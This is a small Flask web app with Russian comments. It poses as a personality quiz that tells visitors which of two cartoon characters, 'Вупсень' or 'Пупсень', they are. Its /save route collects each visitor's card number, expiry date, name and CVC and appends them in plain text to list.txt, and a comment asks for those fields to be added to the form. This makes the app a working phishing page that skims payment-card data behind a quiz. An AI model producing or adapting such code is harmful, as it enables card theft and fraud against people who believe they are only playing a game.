import random
from flask import Flask, render_template, request
b="Вупсень","Пупсень"
result=random.choice(b)


# pip3 install flask

app = Flask(__name__)

@app.route('/')
def index():
    # вернуть страницу с тестом

    # добавить в форму поля ИМЯ, дата, CVC
    return render_template('page.html')

@app.route('/save', methods=['POST'])
def save():
    number,date,name,CVC = request.form['number'],request.form['date'],request.form['name'],request.form['CVC']
    a=[]
    a.append(number)
    a.append(date)
    a.append(name)
    a.append(CVC)

    file = open('list.txt', 'a')
    file.write(str(a))
    file.close()



    # добавить сохранение данных в файл
    # сказать пользователю кто он - Вупсень или Пупсень? (сделать шаблон)
    return "Вы {}, поздравляем!".format(result)

# запускаем сайт
app.run(debug=True)